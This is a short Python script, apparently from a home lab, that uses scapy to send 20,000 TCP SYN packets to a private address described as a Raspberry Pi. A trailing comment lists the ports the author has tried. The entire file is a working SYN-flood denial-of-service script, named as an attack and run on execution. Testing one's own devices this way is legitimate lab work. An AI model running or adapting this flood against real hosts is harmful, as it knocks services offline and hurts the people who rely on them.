from scapy.all import IP, TCP, RandShort, send

def dos_attack():
    for i in range(20000):
        ip = IP(dst="192.168.10.1") # raspberry pi ip address
        tcp = TCP(sport=54335, dport=54335, flags="S", seq=RandShort()) # SYN packet on random tcp port
        packet = ip / tcp
        # display packet
        print(f"Packet number {i+1}")
        print(packet)
        send(packet)
        print("\n")
        
dos_attack()

# I have used 54321, 54322, 54323, 54324, 54325, 54326, 54327, 54330, 54335